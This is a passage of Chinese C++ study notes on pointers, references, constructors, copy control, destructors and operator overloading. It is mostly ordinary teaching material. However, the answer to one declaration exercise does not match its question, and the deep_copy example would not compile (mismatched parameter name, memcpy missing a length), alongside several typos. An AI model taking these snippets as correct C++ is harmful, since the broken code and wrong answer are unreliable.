class="type">int</span>)</span></span>;</span><br><span class="line"><span class="function">PF <span class="title">ff</span><span class="params">(<span class="type">int</span>)</span></span>;   <span class="comment">// 返回类型为函数指针</span></span><br></pre></td></tr></table></figure><blockquote><p>例1：</p><p>用变量a给出下面的定义，一个有10个指针的数组，每个指针指向-一个函数，该函数有一个整型参数并返回一个整型( )。</p><p>解答：</p><p> <code>int (*a[10]) (int)</code>。</p></blockquote><blockquote><p>例2：</p><p>定义一个函数指针，指向的函数有两个int形参并且返回-一个函数指针，返回的指针指向一个有一个int形参且返回int的函数。</p><p>解答：</p><p><code>int (*(*p)[10])(int *)</code>。变量为*p，类型为<code>int (*[10])(int *)</code>。</p></blockquote></li></ul><h4 id="野指针"><a href="#野指针" class="headerlink" title="野指针"></a>野指针</h4><p>野指针是<strong>指向不可用内存</strong>的指针，任何指针变量在创建时，不会自动成为NULL指针（空指针），其默认值是随机的，此时的指针就是野指针。</p><p>当指针调用free或者delete<strong>释放后，未能将其设置为NULL</strong>，也会导致该指针便成为野指针，此时虽然free或delete把指针所指的内存释放掉了，但它们并没有把指针本身释放掉。</p><p>第三个造成野指针的原因是<strong>指针操作超越了变量的作用范围</strong>。</p><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>C++中规定一旦定义了引用，就必须把它跟一个变量绑定起来，并且不能修改这个绑定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">3</span>,j =<span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> &amp;ref=i;     <span class="comment">// 定义i的引用ref</span></span><br><span class="line">cout&lt;&lt;ref;      <span class="comment">//输出3</span></span><br><span class="line">ref=j;          <span class="comment">//注意这里是将i修改为1,而不是修改ref使其绑定到j上</span></span><br><span class="line">cout&lt;&lt;ref;      <span class="comment">//输出1</span></span><br><span class="line">cout&lt;&lt;i;        <span class="comment">//输出1</span></span><br></pre></td></tr></table></figure><p>虽然使用引用和指针都可以间接访问另一个值，但它们之间有几个重要区别：</p><ul><li>引用不能为空，当引用被创建时，必须被初始化。而指针可以为空值，可以在任何时候被初始化；</li><li>一旦一个引用被初始化为指向一个对象，他就不能被改变为对另外一个对象的引用。指针则可以在任何时候指向另一个对象。</li><li>不可能有NULL引用。必须保证引用是一块合法的存储单元关联；</li><li>“sizeof(引用)”所得到的的是指向的变量（对象）的大小，而“sizeof(指针)”得到的是指针本身的大小，通常为4；</li><li>给引用赋值修改的是该引用所关联的对象的值，而并不是使用引用于另一个对象关联；</li><li>引用使用时不需要解引用，而指针需要解引用，引用和指针的自增（++）操作运算符意义不一样；</li><li>如果返回动态分派的对象或内存，必须使用指针，引用可能引起内存泄漏；</li><li>当使用&amp;运算符去一个引用的地址时，其值为所引用变量的地址；而对指针使用&amp;运算符，取的是指针变量的地址。</li></ul><h4 id="const引用（常引用）"><a href="#const引用（常引用）" class="headerlink" title="const引用（常引用）"></a>const引用（常引用）</h4><p>const引用是指const对象的引用，<strong>当引用的对象是const对象时，引用也必须是const</strong>，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> ival=<span class="number">1024</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> &amp;ref1=ival;<span class="comment">//正确</span></span><br><span class="line"><span class="type">int</span> &amp;ref2=ival;<span class="comment">//错误</span></span><br></pre></td></tr></table></figure><p>如果既要利用引用提高程序的效率，又要保护传递给函数的数据不再函数中被改变，就应该使用常引用。常引用主要用于定义一个普通变量的<strong>只读属性的别名</strong>，作为函数的传入形参，避免实参在调用函数中被意外改变。</p><h4 id="引用做类的数据成员"><a href="#引用做类的数据成员" class="headerlink" title="引用做类的数据成员"></a>引用做类的数据成员</h4><p>引用是可以作为类的数据成员的。引用类型数据成员的初始化有以下特点：</p><ul><li>不能直接在构造函数里初始化，<strong>必须用到初始化列表</strong>；</li><li>凡是有引用类型的数据成员的类，<strong>必须定义构造函数</strong>。</li></ul><p>如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ConstRef</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//ci与ri必须在成员初始化列表中初始化，因此必须自定义构造函数，书写成员初始化列表</span></span><br><span class="line">    <span class="built_in">ConstRef</span>(<span class="type">int</span> ii):<span class="built_in">i</span>(ii), <span class="built_in">ci</span>(i), <span class="built_in">ri</span>(ii)&#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> ci;</span><br><span class="line"><span class="type">int</span> &amp;ri;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="8-类"><a href="#8-类" class="headerlink" title="8. 类"></a>8. 类</h2><p>在C++中，模板是泛型编程的基础。模板是创建类或函数的蓝图或公式。</p><h3 id="8-1-访问标号"><a href="#8-1-访问标号" class="headerlink" title="8.1 访问标号"></a>8.1 访问标号</h3><p>访问标号public、 private、 protected 可以多次出现在类定义中。给定的访问标号应用到下一个访问标号出现时为止。</p><p>对于在第一个访问标号之前定义的成员，其访问级别依赖于类是如何定义的。<u><strong>如果类是用struct 关键字定义的，则在第一个访问标号<br>之前的成员是公有的；如果类是用class关键字定义的，则这些成员是私有的</strong></u>。类对其成员的访问形式主要有以下两种:</p><ul><li>内部访问：由类中的成员函数对类的成员的访问。</li><li>对象访问：在类外部，通过类的对象对类的成员的访问。</li></ul><p>类的成员可以有public、protected、 private 三种访问属性，<u><strong>类的成员函数( 内部访问）以及友元函数可以访问类中所有成员</strong>，但是<strong>在类外通过类的对象（对象访问）就只能访问该类的公有成员</strong>。</u>上述权限说明并未考虑有继承的情况，有继承的情况将在下章详细说明。</p><h3 id="8-2-类成员简介"><a href="#8-2-类成员简介" class="headerlink" title="8.2 类成员简介"></a>8.2 类成员简介</h3><p>空类<strong>默认产生</strong><u>默认构造函数、复制构造函数、析构函数、赋值运算符重载函数、取址运算符重载函数、const 取址运算符重载函数</u>等。</p><h4 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h4><p>在类内部，声明成员函数是必需的，而定义成员函数则是可选的。<strong>在类内部定义的函数默认为inline（内联函数）</strong>。</p><p>调用成员函数时，实际上是<strong>使用对象来调用</strong>的。每个成员函数（<strong>除了static 成员函数</strong>外）都有一个<strong>额外的、隐含的形参this</strong>。在调用成员函数时，形参this初始化为调用函数的对象的地址。</p><h4 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h4><p>特殊的成员函数，与类同名，没有返回类型。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。一个类可以有多个构造函数（<strong>构造函数可以重载</strong>），每个构造函数必须有与其他构造函数不同的数目或类型的形参。</p><p>若没有定义显式的构造函数，编译器将自动为这个类生成默认构造函数（不带参数，或者所有的形参都有默认实参）。</p><p>若使用编译器自动生成的默认构造函数（或自己定义一个未进行任何操作的默认构造函数），则类中每个成员，使用与初始化变量相同的规则来进行初始化。</p><ul><li>类成员：运行该类型的默认构造函数来初始化。</li><li>内置或复合类型的成员的初始值依赖于对象的作用域：<strong>在局部作用域中这些成员不被初始化</strong>，而<strong>在全局作用域中它们被初始化为0</strong>。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Student</span>()&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> number;</span><br><span class="line"><span class="type">int</span> score;</span><br><span class="line">&#125;;</span><br><span class="line">Student a;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Student b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中，a与b的name都调用string类的默认构造函数初始化（运行该类型的默认构造函数来初始化）。a中number和score初始化为0，而b是局部对象，故b中number和score不被初始化，为垃圾值。</p><h5 id="成员初始化列表"><a href="#成员初始化列表" class="headerlink" title="成员初始化列表"></a>成员初始化列表</h5><p>构造函数的成员初始化列表为类的一个或多个数据成员指定初值。</p><p><strong>在C++中，成员变量的初始化顺序与变量在类型中的声明顺序相同，而于它们在构造函数的初始化列表中的顺序无关。</strong>构造函数的初始化列表仅仅指定用于初始化成员的值,并不指定这些初始化执行的次序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">A</span>():<span class="built_in">j</span>(<span class="number">0</span>), <span class="built_in">i</span>(j+<span class="number">2</span>)&#123;&#125;    <span class="comment">// 按照声明顺序初始化，先初始化i（此时j还未初始化，所以i是个垃圾值），后初始化j为0。</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">cout&lt;&lt;i&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;j&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">A a;</span><br><span class="line">a.<span class="built_in">print</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>省略初始化列表在构造函数的函数体内对数据成员赋值是合法的。从概念上讲，可以认为构造函数分两个阶段执行:</p><ul><li>初始化阶段（成员初始化列表）</li><li>普通的计算阶段。计算阶段由构造函数函数体中的所有语句组成。</li></ul><p>类类型的数据成员总是在初始化阶段初始化（使用其构造函数），内置和复合类型的尘谷氨只对定义在全局作用域中的对象才初始化（初始化为0），定义在局部作用域中的对象包含包含的内置（int等类型）和复合类型（数组、指针等）的成员没有初始化。</p><p><strong>没有默认构造函数的类类型的成员，以及const类型的成员变量和引用类型的成员变量，都必须在构造函数初始化列表中进行初始化。</strong></p><blockquote><p>假定有一个NoDefault类，它没有定义自己的默认构造函数，却有一个接受一个 string实参的构造函数。因为该类定义了一个构造函数，因此编译器将不合成默认构造函数。编译器将不会为具有NoDefault类型成员的类合成默认构造函数。<strong>如果这样的类希望提供默认构造函数，就必须显式地定义，并且默认构造函数必须显式地初始化其NoDefault成员</strong>（在成员初始化列表中通过传递一个初始的string值给NoDefault构造函数）。</p></blockquote><h5 id="拷贝构造函数"><a href="#拷贝构造函数" class="headerlink" title="拷贝构造函数"></a>拷贝构造函数</h5><p>拷贝构造函数、赋值操作符和析构函数总称为复制控制。<strong>编译器自动实现这些操作，但类也可以定义自己的版本。</strong></p><p>如果类需要析构函数，则它也需要赋值操作符和拷贝构造函数，这是一个有用的经验法则。这个规则常称为三法则，指的是如果需要析构函数，则需要所有这三个复制控制成员。有一种特别常见的情况需要类定义自己的复制控制成员的：类具有指针成员。</p><p><strong>概念：只有单个形参，而且该形参是<u>对本类类型对象的引用</u>(常用const 修饰)，这样的构造函数称为拷贝构造函数(或复制构造函数)。</strong>如果拷贝构造函数的形参不是引用，那么就相当于采用了传值的方式(pass-by-value)，而传值的方式会调用该类的拷贝构造函数，从而造成无穷递归地调用拷贝构造函数。因此<strong>拷贝构造函数的参数必须是一个引用</strong>。</p><p>与默认构造函数一样，拷贝构造函数可由编译器隐式调用。拷贝构造函数可用于：</p><ul><li><p>根据另一个同类型的对象初始化一个对象</p><p>C++支持两种初始化形式：直接初始化和复制初始化。复制初始化使用&#x3D;符号，而直接初始化将初始化式放在圆括号中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">null_book1</span><span class="params">(<span class="string">&quot;9-999-99999-9&quot;</span>)</span></span>;    <span class="comment">//直接初始化</span></span><br><span class="line">string null_book2 = null_book1; <span class="comment">//复制初始化</span></span><br><span class="line"><span class="function">string <span class="title">null_book2</span><span class="params">(null_book1)</span></span>; <span class="comment">//复制初始化</span></span><br><span class="line">string null_book3 = <span class="string">&quot;9-999-99999-9&quot;</span>;   <span class="comment">//复制初始化，等号右侧相当于一个C风格字符串作为形参创建的string临时对象，会产生新的对象</span></span><br><span class="line">string null_book4;</span><br><span class="line">null_book4 = null_book3；<span class="comment">//不是调用复制构造函数，而是利用赋值运算符将null_book3赋值给null_book4，因为之前已经创建了空字符串对象null_book4（属于赋值运算符重载，没有产生新的对象）</span></span><br></pre></td></tr></table></figure></li><li><p>复制一个对象，将它作为实参传给一个函数或从函数返回时复制一个对象</p><p>当函数的形参或返回值为类类型时，将由拷贝构造函数进行复制。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Myclass</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Myclass</span>(<span class="type">int</span> n)&#123;number = n;&#125;</span><br><span class="line"><span class="built_in">Myclass</span>(<span class="type">const</span> Myclass &amp;other)&#123;</span><br><span class="line">number=other.number;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;a &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> number;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(Myclass p)</span></span>&#123;   <span class="comment">// 函数的形参为类类型时，将由复制构造函数进行复制</span></span><br><span class="line"><span class="function">Myclass <span class="title">temp</span><span class="params">(p)</span></span>;   <span class="comment">// 使用复制构造函数来初始化对象temp</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="function">Myclass  <span class="title">obj1</span><span class="params">(<span class="number">10</span>)</span>, <span class="title">obj2</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="function">Myclass <span class="title">obj3</span><span class="params">(obj1)</span></span>;     <span class="comment">// 复制构造函数进行初始化</span></span><br><span class="line"><span class="built_in">fun</span>(obj3);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的输出为a a a 。调用了三次拷贝构造函数，第一次是main中<code>Myclass obj3(obj1);</code> ，第二次是实参obj3到fun形参p，第三次是函数fun中的<code>Myclass temp(p);</code>语句。</p></li><li><p>初始化顺序容器中的元素</p><p>拷贝构造函数可用于初始化顺序容器中的元素。例如，可以用表示容量的单个形参来初始化容器。容器的这种构造方式使用默认构造函数和拷贝构造函数：<code>vector&lt;string&gt; svec(5);</code>编译器首先使用string 默认构造函数创建一个临时值来初始化 svec，然后使用拷贝构造函数将临时值复制到svec的每个元素。</p></li><li><p>根据元素初始化列表初始化数组元素</p><p>如果用常规的花括号括住的数组初始化列表来提供显式元素初始化式，则使用复制初始化来初始化每个元素。根据指定值创建适当类型的元素，然后用复制构造函数将该值复制到相应元素：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sales_ item primer_ eds[] = &#123;<span class="built_in">string</span> (<span class="string">&quot;0-201-16487-6&quot;</span>), <span class="built_in">string</span> (<span class="string">&quot;0-201-54848-8&quot;</span>), <span class="built_in">string</span> (<span class="string">&quot;0-201-82470-1&quot;</span>)&#125;;</span><br></pre></td></tr></table></figure></li></ul><h5 id="x3D-x3D-浅复制与深复制-x3D-x3D"><a href="#x3D-x3D-浅复制与深复制-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;浅复制与深复制&#x3D;&#x3D;"></a>&#x3D;&#x3D;浅复制与深复制&#x3D;&#x3D;</h5><ul><li><p>浅复制</p><p>被复制对象的所有变量都含有与原来的对象相同的值，而变量中所有的对其他对象的引用仍然指向原来的对象。换言之，浅复制仅仅复制所考虑的对象，而不复制它所引用的对象。</p></li><li><p>深复制</p><p>被复制对象的所有变量都含有与原来的对象相同的值，除去那些引用其他对象的变量。那些引用其他对象的变量将指向被复制过的新对象，也就是把引用变量所引用的对象也复制一遍。</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="type">char</span> *ptr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shallow_copy</span><span class="params">(Test &amp; src, Test &amp; dest)</span> </span>&#123;</span><br><span class="line">dest.ptr=src.ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">deep_copy</span><span class="params">(Test &amp; srC, Test &amp; dest)</span> </span>&#123;</span><br><span class="line">dest.ptr=<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(src.ptr) +<span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(dest.ptr, src.ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>浅复制可能会导致运行时错误，特别是在对象的创建与删除过程中。</p><h4 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h4><p>析构函数进行资源的回收，作为类构造函数的补充。<strong>当对象超出作用域或动态分配的对象被删除时，将自动应用析构函数</strong>。析构函数<strong>可用于释放对象构造时或在对象的生命期中所获取的资源</strong>。不管类是否定义了自己的析构函数，编译器都<strong>自动执行</strong>类中非static数据成员的析构函数。</p><p>虽然构造函数不能被定义成虚函数，但析构函数可以定义为虚函数，一般来说，如果类中定义了虛函数，析构函数也应被定义为虚析构函数,尤其是类内有申请的动态内存，需要清理和释放的时候。</p><p>与复制构造函数和赋值操作符不同，<strong>无论类是否定义了自己的析构函数，都会创建和运行合成析构函数</strong>。如果类定义了析构函数，则在类定义的析构函数结束之后运行合成析构函数。合成析构函数**<u>按对象创建时的逆序撤销每个非static 成员，因此，它按成员在类中声明次序的逆序撤销成员</u>**。对于类类型的每个成员，合成析构函数调用该成员的析构函数来撤销对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>()&#123;cout&lt;&lt;<span class="string">&quot;A&quot;</span>;&#125;;    </span><br><span class="line">    ~<span class="built_in">A</span>()&#123;cout&lt;&lt;<span class="string">&quot;~A&quot;</span>;&#125; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">B</span>(A &amp;a):_a(a)&#123;  <span class="comment">// _a(a)调用了拷贝构造函数，用对象a初始化对象_a，拷贝构造函数自动生成，无输出</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;;    </span><br><span class="line">    ~<span class="built_in">B</span>()&#123;cout&lt;&lt;<span class="string">&quot;~B&quot;</span>;&#125; </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    A _a;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    A a;</span><br><span class="line">    <span class="function">B <span class="title">b</span><span class="params">(a)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为AB~B~A~A。构造过程：A A B，那么析构过程为：B A A。注意之所以构造了两个A，是因为“a _(a)”调用了拷贝构造函数对B类对象中A初始化，而拷贝构造函数采用的是系统自动生成的版本，没有输出。</p><h4 id="构造函数与析构函数调用顺序"><a href="#构造函数与析构函数调用顺序" class="headerlink" title="构造函数与析构函数调用顺序"></a>构造函数与析构函数调用顺序</h4><ul><li><p>单继承</p><p>派生时，构造函数和析构函数是不能继承的，为了对基类成员进行初始化，必须<strong>对派生类重新定义构造函数和析构函数，并在构造函数的初始化列表中调用基类的构造函数</strong>。由于派生类对象通过继承而包含了基类数据成员，因此，创建派生类对象时，系统&#x3D;&#x3D;<u><strong>首先通过派生类的构造函数来调用基类的构造函数，完成基类成员的初始化，而后对派生类中新增的成员进行初始化</strong></u>&#x3D;&#x3D;。</p><p>**必须将基类的构造函数放在派生类的初始化列表中，以调用基类构造函数完成基类数据成员的初始化(若无，则调用基类的默认构造函数)**，派生类构造函数实现的功能，或者说调用顺序为：</p><ol><li><p>完成对象所占整块内存的开辟，由系统在调用构造函数时自动完成。</p></li><li><p>调用基类的构造函数完成基类成员的初始化。</p></li><li><p>若派生类中含对象成员、const 成员或引用成员，则必须在初始化表中完成其初始化。</p></li><li><p>派生类构造函数体执行。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">A</span>()&#123;cout&lt;&lt;<span class="string">&quot;A&quot;</span>;&#125;;    </span><br><span class="line">    ~<span class="built_in">A</span>()&#123;cout&lt;&lt;<span class="string">&quot;~A&quot;</span>;&#125; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:<span class="keyword">public</span> A&#123;    <span class="comment">// 类B继承自类A</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">B</span>(A &amp;a):_a(a)&#123;  <span class="comment">// _a(a)调用了拷贝构造函数，用对象a初始化对象_a，拷贝构造函数自动生成，无输出</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;;    </span><br><span class="line">    ~<span class="built_in">B</span>()&#123;cout&lt;&lt;<span class="string">&quot;~B&quot;</span>;&#125; </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    A _a;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">    A a;    <span class="comment">// 语句1</span></span><br><span class="line">    <span class="function">B <span class="title">b</span><span class="params">(a)</span></span>; <span class="comment">// 语句2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>输出为AAB~B~A~A~A。构造过程：A A A B，那么析构过程为：B A A A。</p><p>首先语句1构造一个A的对象，输出A；</p><p>然后语句2中，由于B有父类A，所以先调用父类A的构造函数，输出A。</p><p>然后B的构造函数初始化列表“a _(a)”调用了拷贝构造函数构造一个A的对象，而拷贝构造函数采用的是系统自动生成的版本，没有输出。但是析构的时候会输出。</p><p>最后执行B的构造函数，输出B。析构时与构造顺序相反。</p></blockquote></li><li><p>多继承</p><p>多继承时，派生类的构造函数初始化列表需要调用各个基类的构造函数。</p><p><strong>注意：</strong>此时构造函数初始化列表只能控制用于初始化基类的值，不能控制基类的构造次序。<strong>基类构造函数按照基类构造函数在类派生列表中的出现次序调用</strong>。</p></li><li><p>虚继承</p><p>首先调用虚基类的构造函数，虚基类如果有多个，则虚基类构造函数的调用顺序是此虚基类在当前类派生表中出现的顺序而不是它们在成员初始化表中的顺序。</p></li></ul><h4 id="操作符重载"><a href="#操作符重载" class="headerlink" title="操作符重载"></a>操作符重载</h4><p>操作符重载函数的名字为operator 后跟着所定义的操作符的符号。像任何其他函数一样，<strong>操作符重载函数有一个返回值和一个形参表</strong>。<strong>形参表必须具有与该操作符数目相同的形参</strong>（如果操作符是一个类成员，则包括隐式this形参）。</p><p>大多数操作符可以定义为成员函数或非成员函数。<strong>当操作符为成员函数时，它的第一个操作数隐式绑定到this 指针。</strong>有些操作符(包括赋值操作符)必须是类的成员函数。<u>比如赋值就必须是类的成员，所以this绑定到指向左操作数的指针。因此，赋值操作符接受单个形参，且该形参是同一类类型的对象。右操作数一般作为const引用传递。</u></p><p>并非所有操作符都是可重载的，下表给出可重载和不可重载的操作符。<strong>带“点”的都不能重载。</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220629152653268.png" alt="image-20220629152653268"></p><h5 id="赋值操作符重载"><a href="#赋值操作符重载" class="headerlink" title="赋值操作符重载"></a>赋值操作符重载</h5><p><strong>在写赋值操作符重载函数时需要注意：</strong></p><ul><li>返回值类型为引用（允许连续赋值），形参为常量引用（避免调用拷贝构造函数，产生无谓的消耗）</li><li>记得判断传入实例和当前实例*this是否为同一实例</li><li>释放实例自身已有的内存，否则可能引起内存泄露</li></ul><p>例子如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CMyString</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">CMyString</span>(<span class="type">const</span> <span class="type">char</span>* pData_NULL);   <span class="comment">// 自定义构造函数</span></span><br><span class="line">    <span class="built_in">CMyString</span> (<span class="type">const</span> CMyString&amp; other);  <span class="comment">// 自定义拷贝构造函数</span></span><br><span class="line">    ~<span class="built_in">CMyString</span>();    <span class="comment">// 自定义析构函数</span></span><br><span class="line">    CMyString&amp; CMyString::<span class="keyword">operator</span>=(<span class="type">const</span> CMyString &amp;str);   <span class="comment">// 赋值运算符的重载，函数名为operator=，形参为const CMyString &amp;str，返回类型为CMyString&amp;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span>* m pData;</span><br><span class="line">&#125;;</span><br><span 